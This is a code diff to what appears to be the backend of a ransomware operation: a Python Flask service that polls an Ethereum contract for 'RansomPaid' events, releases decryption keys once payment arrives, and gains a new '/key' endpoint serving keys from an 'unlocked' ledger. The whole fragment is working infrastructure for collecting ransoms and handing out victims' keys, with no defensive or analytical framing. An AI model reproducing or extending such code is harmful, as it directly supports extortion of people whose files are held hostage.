@@ -27,16 +27,16 @@ transfer_filter = contract.eventFilter("RansomPaid")
 w3.personal.unlockAccount(w3.eth.accounts[0], 'testacc')
 
 # Checks for new ransom every 5 seconds and sends key to contract if there is one
-def check_ransoms(ledger):
+def check_ransoms(ledger, unlocked_ledger):
     for entry in transfer_filter.get_new_entries():
         # TODO Check if decrypts properly
         data = entry['args']['data']
         # TODO If check on data
         contract.transact({'from': w3.eth.accounts[0]}).provideKey(data, ledger[data])
 
-    threading.Timer(5.0, check_ransoms, [ledger]).start()
+    threading.Timer(5.0, check_ransoms, [ledger, unlocked_ledger]).start()
 
-check_ransoms(ransom_ledger)
+check_ransoms(ransom_ledger, unlocked)
 
 @app.route('/ransom', methods=['get'])
 def get_ransom_info():
@@ -49,3 +49,11 @@ def get_ransom_info():
 @app.route('/data')
 def get_dict():
     return str(ransom_ledger)
+
+@app.route('/key', methods=['get'])
+def give_key():
+    sha_hash = request.args.get('hash')
+    if unlocked[sha_hash]:
+        return json.dumps({'key': int(unlocked[sha_hash])})
+    else:
+        return ""
